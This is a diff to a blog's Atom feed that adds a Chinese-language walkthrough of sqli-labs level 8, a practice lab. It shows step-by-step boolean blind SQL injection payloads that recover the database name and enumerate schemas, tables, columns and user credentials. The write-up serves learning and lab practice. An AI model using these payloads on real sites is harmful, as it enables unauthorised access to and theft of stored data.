@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2022-12-25T07:21:52.992Z</updated>
+  <updated>2023-01-05T12:15:31.140Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,27 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>sqli-labs-8</title>
+    <link href="http://example.com/2022/12/25/sqli-labs-8/"/>
+    <id>http://example.com/2022/12/25/sqli-labs-8/</id>
+    <published>2022-12-25T08:13:48.000Z</published>
+    <updated>2023-01-05T12:15:31.140Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="sqli-labs-8"><a href="#sqli-labs-8" class="headerlink" title="sqli-labs-8"></a>sqli-labs-8</h1><span id="more"></span><h2 id="初步判断"><a href="#初步判断" class="headerlink" title="初步判断"></a>初步判断</h2><p>输入正确的id</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1</span><br></pre></td></tr></table></figure><p>页面显示：</p><blockquote><p>You are in………..</p></blockquote><p>说明本题不回显<br>加上’<br>页面显示异常，本题报错不回显<br>输入–+<br>页面显示正常<br>说明有包装</p><p>本题需要我们使用盲注来获取信息</p><h2 id="获取数据库名称"><a href="#获取数据库名称" class="headerlink" title="获取数据库名称"></a>获取数据库名称</h2><p>先判断数据库名称的长度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and (length(database()))=1 --+</span><br></pre></td></tr></table></figure><p>从1一直到8时<br>此时页面显示you are in……<br>说明数据库名称长度为8</p><p>用left获取数据库名称从左到右的字符这里（也可以使用ascii等）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and left((select database()),1)=&#x27;s&#x27; --+</span><br></pre></td></tr></table></figure><p>依次增加数字和尝试后面的字符，可以配合&gt;,&lt;,&#x3D;,二分法一起使用<br>如url?id&#x3D;1’ and left((select database()),1)&gt;’a’ –+<br>最终可以得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27; and left((select database()),8)=&#x27;security&#x27;</span><br></pre></td></tr></table></figure><p>即数据库名称等于security</p><h2 id="获取所有信息"><a href="#获取所有信息" class="headerlink" title="获取所有信息"></a>获取所有信息</h2><p>除此之外我们还可以获得所有数据库的名称，使用同样的方法去一个一个才出来，也可以使用sqlmap直接跑，获取所有的内容<br>如果手工注入可能花费的时间比较久<br>payload如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//获取所有数据库名称</span><br><span class="line">url?id=1&#x27; and left((select schema_name from information_schema.schemata limit 0,1),5)=&#x27;mysql&#x27; --+ //查出来本地的第一个数据库为mysql</span><br><span class="line">//获取security数据库下的所有表名</span><br><span class="line">?id=1&#x27; and left((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1)&gt;&#x27;a&#x27; --+</span><br><span class="line">//获取security数据库users表下的所有列名</span><br><span class="line">?id=1&#x27; and left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 0,1),1)&gt;&#x27;a&#x27; --+</span><br><span class="line">//获取所有username和password</span><br><span class="line">?id=1&#x27; and left((select username from users limit 0,1),1)&gt;&#x27;a&#x27; --+</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+    <summary type="html">&lt;h1 id=&quot;sqli-labs-8&quot;&gt;&lt;a href=&quot;#sqli-labs-8&quot; class=&quot;headerlink&quot; title=&quot;sqli-labs-8&quot;&gt;&lt;/a&gt;sqli-labs-8&lt;/h1&gt;</summary>
+    
+    
+    
+    <category term="sqli-labs" scheme="http://example.com/categories/sqli-labs/"/>
+    
+    
+    <category term="sqli-labs" scheme="http://example.com/tags/sqli-labs/"/>
+    
+  </entry>
   
   <entry>
     <title>SQL盲注</title>
